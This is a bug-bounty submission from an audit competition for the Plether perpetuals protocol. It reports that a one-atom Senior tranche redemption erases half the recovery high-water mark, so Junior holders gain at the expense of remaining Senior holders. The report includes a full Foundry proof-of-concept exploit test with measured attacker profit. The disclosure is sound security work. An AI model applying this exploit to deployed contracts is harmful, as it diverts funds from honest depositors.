# \#99678 [SC-Low] A one-atom Senior redemption erases half the recovery high-water mark

**Submitted on Nov 14th 2026 at 19:25:51 UTC by @nemveer for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99678
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Theft of unclaimed yield

## Description

## Brief/Intro
When Senior principal is nearly wiped out, a holder can burn about one-third of the Senior shares for one USDG atom and remove **half** of the tranche's high-water mark. That mark protects the holders who remain: later revenue should restore their losses before Junior receives any. The redemption instead cuts their recovery priority, so a holder with Junior exposure can benefit at their expense.

## Vulnerability Details
`HousePool._settleLpEpoch` freezes Senior principal `P` and share supply `S` before funding redemptions (`packages/perps/src/HousePool.sol:845-860`). The vault's net quote includes ERC-4626 virtual offsets: with no frozen-oracle fee, `A = floor(s × (P + 1) / (S + 1000))` for `s` redeemed shares (`packages/perps/src/libraries/HousePoolRedemptionMathLib.sol:39-47`). But after paying `A`, `scaleSeniorOnWithdraw` removes `floor(H × A / P)` from the high-water mark `H` (`packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol:119-135`). The shares burned do not enter that calculation.

At `P = 2` atoms, the virtual asset lets roughly one-third of the shares quote one atom. The payout is half of `P`, so the pool deletes half of `H` even though roughly two-thirds of the shares still exist. The full-balance redemption exception permits the request despite its tiny asset value (`packages/perps/src/TrancheVault.sol:1611-1617`). The error becomes valuable on recovery: `distributeRevenue` restores Senior only up to the reduced mark and credits the remainder to Junior (`packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol:140-159`).

This demonstrates that the stated fix for [Cecuro MED-11](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-ai-audit-report-2026-10-26.pdf) is incomplete. That fix replaced share-based HWM reduction with `H × A / P` to address an earlier mismatch. Near a complete Senior wipe, the virtual asset makes `A / P` **larger** than the fraction of shares burned, so the new calculation removes too much protection.

## Impact Details
In a same-state control after an Engine-driven loss, a one-atom redemption lowers the surviving honest Senior holder's value by **13,333.865633 USDG** after 110,000 USDG of recognized recovery. Junior receives the value diverted past the reduced mark. In the test, the redeeming account's Junior gain exceeds the Senior value it gives up by **13,330.609426 USDG**.

The PoC uses the release's six-feed basket, VPI and risk settings, 40 million USDG exposure limit, and 80% Senior cap. The attacker funds Junior shares through an ordinary deposit and receives Senior shares through an ERC-20 transfer before the trading loss. The measured profit compares those same holdings in both branches; it does not assume free acquisition. Reaching two atoms requires a severe market move to the 2.00 basket cap and precise pool funding. Later recovery must be recognized through the owner's documented `accountExcess()` action. These conditions limit practical frequency, but the test does not change any in-scope contract or use inactive risk settings.



## Proof of Concept

## Proof of Concept

Attach the single file `PoC_SeniorHwmRoundingReleaseEngine.t.sol` and place it at `packages/perps/test/poc/PoC_SeniorHwmRoundingReleaseEngine.t.sol` in a checkout of commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. Run from the repository root:

```sh
forge test --root packages/perps --offline --match-path 'test/poc/PoC_SeniorHwmRoundingReleaseEngine.t.sol' -vv
```

The file uses the repository's `BasePerpTest` fixture and production Router, Engine, pool, and vault entry points. It deploys the release six-feed Oracle through the normal configuration timelock; MockPyth supplies historical updates. Ten Router opens and two closes leave **two cash atoms**, **zero trader claims**, and no degraded-mode latch. A dust Junior redemption in the same epoch is refunded; the attacker can control that auxiliary account. The Senior redemption pays one atom and halves the mark. The test restores a snapshot taken before the redemption, applies the same 110,000 USDG recovery to both branches, and asserts the honest Senior loss and attacker gain. It does not burn pool tokens or overwrite storage. The exact command above passed **1 test, 0 failures** on the competition commit.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "test/perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/// @notice Exercises the release six-feed basket and risk settings through Router and vault calls.
///         Mock Pyth supplies the price marks; pool cash is never burned or storage-written.
abstract contract PoC_HwmRoundEngine is BasePerpTest {
    address internal constant LONG_TRADER = address(0xAA01);
    address internal constant SHORT_TRADER = address(0xAA02);
    address internal constant ATTACKER = address(0xAA03);
    address internal constant JUNIOR_HOLDER = address(0xAA04);
    address internal constant KEEPER = address(0xAA05);
    address internal constant HONEST_SENIOR = address(0xAA06);
    address internal constant RECOVERY_DONOR = address(0xAA07);

    uint256 internal constant ENTRY = 100_000_000;
    uint256 internal constant FIRST_CLOSE = 95_000_000;
    uint256 internal constant SECOND_CLOSE = 200_000_000;
    uint256 internal constant CHUNK = 20_000e18;
    uint256 internal constant TOTAL_SIZE = 100_000e18;
    uint256 internal constant RECOVERY = 110_000e6;

    function _releaseIds() internal pure returns (bytes32[] memory a) {
        a = new bytes32[](6);
        a[0] = 0xa995d00bb36a63cef7fd2c287dc105fc8f3d93779f062f09551b0af3e81ec30b;
        a[1] = 0xef2c98c804ba503c6a707e38be4dfbb16683775f195b091252bf24693042fd52;
        a[2] = 0x84c2dde9633d93d1bcad84e7dc41c9d56578b7ec52fabedc1f335d673df0a7c1;
        a[3] = 0x3112b03a41c910ed446852aacf67118cb1bec67b2cd0b9a214c58cc0eaa2ecca;
        a[4] = 0x8ccb376aa871517e807358d4e3cf0bc7fe4950474dbe6c9ffc21ef64e43fc676;
        a[5] = 0x0b1e3297e69f162877b577b0d6a47a0d63b2392bc8499e6540da4187a63e28f8;
    }

    function _releaseWeights() internal pure returns (uint256[] memory a) {
        a = new uint256[](6);
        a[0] = 576e15;
        a[1] = 136e15;
        a[2] = 119e15;
        a[3] = 91e15;
        a[4] = 42e15;
        a[5] = 36e15;
    }

    function _releaseBases() internal pure returns (uint256[] memory a) {
        a = new uint256[](6);
        a[0] = 117_500_000;
        a[1] = 638_000;
        a[2] = 134_480_000;
        a[3] = 72_880_000;
        a[4] = 10_860_000;
        a[5] = 126_100_000;
    }

    function _releaseInversions() internal pure returns (bool[] memory a) {
        a = new bool[](6);
        a[1] = true;
        a[3] = true;
        a[4] = true;
        a[5] = true;
    }

    function _sixFeedData(uint256 target) internal returns (bytes[] memory data) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 publishTime = _mockHistoricalPublishTime();
        bytes32[] memory ids = _releaseIds();
        uint256[] memory bases = _releaseBases();
        bool[] memory inversions = _releaseInversions();
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](6);
        for (uint256 i; i < 6; ++i) {
            uint256 raw = inversions[i] ? 1e24 / (bases[i] * target) : bases[i] * target / 1e8;
            updates[i] = MockPyth.FeedUpdate({
                id: ids[i],
                price: MockPyth.MockPrice({
                    price: int64(uint64(raw)), conf: 0, expo: -8,
                    publishTime: publishTime, prevPublishTime: publishTime - 1
                })
            });
        }
        data = new bytes[](1);
        data[0] = abi.encode(updates);
    }

    struct Outcome {
        uint256 seniorPrincipal;
        uint256 juniorPrincipal;
        uint256 seniorHwm;
        uint256 honestSeniorAssets;
        uint256 juniorHolderAssets;
        uint256 attackerJuniorAssets;
        uint256 attackerSeniorAssets;
    }

    function _riskParams() internal pure virtual override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorSeedDeposit() internal pure virtual override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _juniorSeedReceiver() internal view override returns (address) {
        return address(this);
    }

    function _seniorSeedReceiver() internal pure override returns (address) {
        return HONEST_SENIOR;
    }

    function _seniorFunding() internal pure virtual returns (uint256) {
        return 100_000e6;
    }

    function _configureBeforeFunding() internal virtual {}

    function setUp() public override {
        super.setUp();
        _configureBeforeFunding();
        _fundJunior(JUNIOR_HOLDER, 1e6);
        _fundJunior(ATTACKER, 24_543_004_997);
        _fundSenior(HONEST_SENIOR, _seniorFunding());
        _fundTrader(LONG_TRADER, 30_000e6);
        _fundTrader(SHORT_TRADER, 30_000e6);
    }

    function _execute(
        address trader,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool close,
        uint256 price
    ) internal returns (OrderV3Types.ExecutionResult memory result) {
        uint32 window = uint32(router.maxExecutionWindowSeconds());
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: bytes32(uint256(router.nextCommitId())),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: (side == CfdTypes.Side.LONG) == close ? type(uint256).max : 1,
            isClose: close,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp()) + uint64(window),
                executionWindowSeconds: window,
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(trader);
        uint64 id = router.commitOrder(request);
        bytes[] memory data = _sixFeedData(price);
        vm.roll(vm.getBlockNumber() + 1);
        vm.prank(KEEPER);
        result = router.executeOrder(id, data);
    }

    function _openHedges() internal {
        for (uint256 i; i < 5; ++i) {
            OrderV3Types.ExecutionResult memory b =
                _execute(SHORT_TRADER, CfdTypes.Side.SHORT, CHUNK, 2_000e6, false, ENTRY);
            assertEq(uint8(b.status), uint8(OrderV3Types.LifecycleStatus.Executed), "SHORT open");
            OrderV3Types.ExecutionResult memory a =
                _execute(LONG_TRADER, CfdTypes.Side.LONG, CHUNK, 2_000e6, false, ENTRY);
            assertEq(uint8(a.status), uint8(OrderV3Types.LifecycleStatus.Executed), "LONG open");
        }
    }

    function _recover() internal returns (Outcome memory o) {
        // A separate donor supplies future revenue in both branches. The owner
        // recognizes it using the normal excess-accounting entry point.
        settlementToken.mint(RECOVERY_DONOR, RECOVERY);
        vm.prank(RECOVERY_DONOR);
        settlementToken.transfer(address(pool), RECOVERY);
        pool.accountExcess();
        settlementToken.mint(address(this), 1e6);
        settlementToken.approve(address(seniorVault), 1e6);
        uint256 depositId = seniorVault.requestDeposit(1e6, address(this));
        vm.warp(pool.lpEpochStart(depositId));
        pool.settleLpEpoch(0, 0);
        o.seniorPrincipal = pool.seniorPrincipal();
        o.juniorPrincipal = pool.juniorPrincipal();
        o.seniorHwm = pool.seniorHighWaterMark();
        o.honestSeniorAssets = seniorVault.convertToAssets(seniorVault.balanceOf(HONEST_SENIOR));
        o.juniorHolderAssets = juniorVault.convertToAssets(juniorVault.balanceOf(JUNIOR_HOLDER));
        o.attackerJuniorAssets = juniorVault.convertToAssets(juniorVault.balanceOf(ATTACKER));
        o.attackerSeniorAssets = seniorVault.convertToAssets(seniorVault.balanceOf(ATTACKER));
    }

    function _requestJuniorZeroHead() internal returns (uint256 id) {
        uint256 shares = juniorVault.balanceOf(JUNIOR_HOLDER);
        assertGt(shares, 0, "ordinary Junior holder has shares");
        vm.prank(JUNIOR_HOLDER);
        id = juniorVault.requestRedeem(shares, JUNIOR_HOLDER, JUNIOR_HOLDER);
    }

    function _claimJuniorRefund(uint256 id) internal {
        vm.prank(JUNIOR_HOLDER);
        uint256 shares = juniorVault.claimRedeemRefund(id, JUNIOR_HOLDER, JUNIOR_HOLDER);
        assertGt(shares, 0, "zero-quote Junior head is fully refunded");
    }

    function _assertReleaseConfiguration() internal view {
        (bool ok, bytes memory raw) = address(engine).staticcall(abi.encodeWithSignature("riskParams()"));
        assertTrue(ok, "risk parameter getter");
        CfdTypes.RiskParams memory risk = abi.decode(raw, (CfdTypes.RiskParams));
        assertEq(risk.vpiFactor, 0.01e18);
        assertEq(risk.maxSkewRatio, 0.4e18);
        assertEq(risk.maintMarginBps, 10);
        assertEq(risk.initMarginBps, 20);
        assertEq(risk.fadMarginBps, 300);
        assertEq(risk.baseCarryBps, 500);
        assertEq(risk.minBountyAssets, 1e6);
        assertEq(risk.bountyBps, 10);
        assertEq(risk.keeperShareBps, 5000);
        assertEq(risk.protocolShareBps, 0);
        assertEq(engine.CAP_PRICE(), 2e8);
        assertEq(engine.frozenCloseSpreadBps(), 50);
        assertEq(engine.executionFeeBps(), 4);
        assertEq(engine.settlementBufferBps(), 25);
        assertEq(pool.maxSeniorExposureAssets(), 40_000_000e6);
        assertEq(pool.maxSeniorShareBps(), 8000);
        assertEq(router.minOpenNotionalAssets(), 1000e6);
        assertEq(router.maxPendingOrders(), 5);
        assertEq(pletherOracle.adverseConfidenceMultiplierBps(), 2500);
        assertEq(pletherOracle.basketMaxConfidenceRatioBps(), 10);
        assertEq(address(router.pletherOracle()), address(pletherOracle));
        bytes32[] memory ids = _releaseIds();
        uint256[] memory weights = _releaseWeights();
        uint256[] memory bases = _releaseBases();
        bool[] memory inversions = _releaseInversions();
        for (uint256 i; i < 6; ++i) {
            assertEq(pletherOracle.pythFeedIds(i), ids[i]);
            assertEq(pletherOracle.quantities(i), weights[i]);
            assertEq(pletherOracle.basePrices(i), bases[i]);
            assertEq(pletherOracle.inversions(i), inversions[i]);
        }
    }

    function test_HwmRound_OrganicTwoAtomRedemption() public {
        _assertReleaseConfiguration();
        uint256 supply = seniorVault.accruedTotalSupply();
        uint256 attackerShares = (supply + 1000 + 2) / 3;
        vm.warp(vm.getBlockTimestamp() + seniorVault.DEPOSIT_COOLDOWN() + 1);
        vm.prank(HONEST_SENIOR);
        seniorVault.transfer(ATTACKER, attackerShares);
        assertGt(seniorVault.balanceOf(HONEST_SENIOR), seniorVault.seedShareFloor(), "honest Senior remains");
        _openHedges();
        emit log_named_decimal_uint("cash after opens", pool.totalAssets(), 6);

        OrderV3Types.ExecutionResult memory first =
            _execute(LONG_TRADER, CfdTypes.Side.LONG, TOTAL_SIZE, 0, true, FIRST_CLOSE);
        assertEq(uint8(first.status), uint8(OrderV3Types.LifecycleStatus.Executed), "LONG close");
        emit log_named_decimal_uint("cash after first close", pool.totalAssets(), 6);
        assertFalse(engine.degradedMode(), "first close must remain solvent");

        OrderV3Types.ExecutionResult memory second =
            _execute(SHORT_TRADER, CfdTypes.Side.SHORT, TOTAL_SIZE, 0, true, SECOND_CLOSE);
        assertEq(uint8(second.status), uint8(OrderV3Types.LifecycleStatus.Executed), "SHORT close");
        emit log_named_decimal_uint("cash after second close", pool.totalAssets(), 6);
        emit log_named_decimal_uint("trader claims after second close", engine.totalTraderClaimBalanceAssets(), 6);
        assertEq(engine.totalTraderClaimBalanceAssets(), 0, "trader payouts are complete");
        assertEq(pool.totalAssets(), 2, "ordinary trader settlements leave two cash atoms");
        assertFalse(engine.degradedMode(), "second close must remain solvent");
        emit log_named_uint("senior P before redemption", pool.seniorPrincipal());
        emit log_named_uint("senior H before redemption", pool.seniorHighWaterMark());

        vm.warp(vm.getBlockTimestamp() + seniorVault.DEPOSIT_COOLDOWN() + 1);
        uint256 snapshot = vm.snapshotState();
        uint256 juniorRequestId = _requestJuniorZeroHead();
        vm.prank(ATTACKER);
        uint256 requestId = seniorVault.requestRedeem(attackerShares, ATTACKER, ATTACKER);
        assertEq(requestId, juniorRequestId, "both tranche requests mature together");
        uint256 settlementTime = pool.lpEpochStart(requestId);
        vm.warp(settlementTime);
        (uint256 projectedSenior, uint256 projectedJunior, uint256 freeSenior,) = pool.getPendingTrancheState();
        emit log_named_uint("projected senior P before redemption", projectedSenior);
        emit log_named_uint("projected junior P before redemption", projectedJunior);
        emit log_named_uint("projected senior withdrawal cap", freeSenior);
        assertEq(projectedSenior, 2, "organic terminal P is two atoms");
        assertEq(freeSenior, 2, "two free atoms before funding");
        IHousePool.LpEpochSettlementResult memory r = pool.settleLpEpoch(0, 0);
        emit log_named_uint("senior P after redemption", pool.seniorPrincipal());
        emit log_named_uint("senior H after redemption", pool.seniorHighWaterMark());
        emit log_named_uint("funded senior atoms", r.seniorFundedAssets);
        assertEq(r.seniorFundedAssets, 1, "one-atom Senior payout");
        assertEq(pool.seniorPrincipal(), 1, "one Senior principal atom remains");
        _claimJuniorRefund(juniorRequestId);

        uint256 attackedHwm = pool.seniorHighWaterMark();
        Outcome memory attacked = _recover();
        emit log_named_decimal_uint("attacked recovered Senior P", attacked.seniorPrincipal, 6);
        emit log_named_decimal_uint("attacked recovered Junior P", attacked.juniorPrincipal, 6);
        emit log_named_decimal_uint("attacked honest Senior assets", attacked.honestSeniorAssets, 6);
        emit log_named_decimal_uint("attacked Junior holder assets", attacked.juniorHolderAssets, 6);
        emit log_named_decimal_uint("attacked attacker Junior assets", attacked.attackerJuniorAssets, 6);

        assertTrue(vm.revertToState(snapshot), "restore pre-redemption control state");
        uint256 controlJuniorRequestId = _requestJuniorZeroHead();
        assertEq(controlJuniorRequestId, juniorRequestId, "matched control epoch");
        vm.warp(settlementTime);
        IHousePool.LpEpochSettlementResult memory controlSettlement = pool.settleLpEpoch(0, 0);
        assertEq(controlSettlement.seniorFundedAssets, 0, "control has no redemption");
        _claimJuniorRefund(controlJuniorRequestId);
        uint256 controlHwm = pool.seniorHighWaterMark();
        assertEq(attackedHwm, controlHwm - controlHwm / 2, "one atom consumes half HWM");
        Outcome memory control = _recover();
        emit log_named_decimal_uint("control recovered Senior P", control.seniorPrincipal, 6);
        emit log_named_decimal_uint("control recovered Junior P", control.juniorPrincipal, 6);
        emit log_named_decimal_uint("control honest Senior assets", control.honestSeniorAssets, 6);
        emit log_named_decimal_uint("control Junior holder assets", control.juniorHolderAssets, 6);
        emit log_named_decimal_uint("control attacker Junior assets", control.attackerJuniorAssets, 6);
        emit log_named_decimal_uint("control attacker Senior assets", control.attackerSeniorAssets, 6);
        emit log_named_decimal_uint("victim Senior loss", control.honestSeniorAssets - attacked.honestSeniorAssets, 6);
        emit log_named_decimal_uint("Junior holder benefit", attacked.juniorHolderAssets - control.juniorHolderAssets, 6);
        uint256 attackerJuniorGain = attacked.attackerJuniorAssets - control.attackerJuniorAssets;
        emit log_named_decimal_uint("attacker net gain", attackerJuniorGain + 1 - control.attackerSeniorAssets, 6);
        assertGt(control.honestSeniorAssets, attacked.honestSeniorAssets, "honest Senior loses recovery");
        assertGt(attacked.juniorHolderAssets, control.juniorHolderAssets, "Junior captures recovery");
        assertGt(attackerJuniorGain + 1, control.attackerSeniorAssets, "attacker gains after Senior sacrifice");
    }
}

/// @notice Same organic path under an 80% Senior share cap.
contract PoC_HwmRoundEngineEightyPercent is PoC_HwmRoundEngine {
    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _seniorFunding() internal pure override returns (uint256) {
        return 80_000e6;
    }

    function _configureBeforeFunding() internal override {
        _setSeniorCapacity(40_000_000e6, 8_000);
        pletherOracle = new PletherOracle(
            address(engine), address(pool), address(baseMockPyth),
            _releaseIds(), _releaseWeights(), _releaseBases(), _releaseInversions()
        );
        routerAdmin.proposeOracleConfig(IOrderRouterAdminHost.OracleConfig(address(pletherOracle)));
        vm.warp(routerAdmin.oracleConfigActivationTime());
        routerAdmin.finalizeOracleConfig();
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.adverseConfidenceMultiplierBps = 2500;
        config.minOpenNotionalAssets = 1000e6;
        config.maxPendingOrders = 5;
        _setRouterConfig(config);
    }

}
```
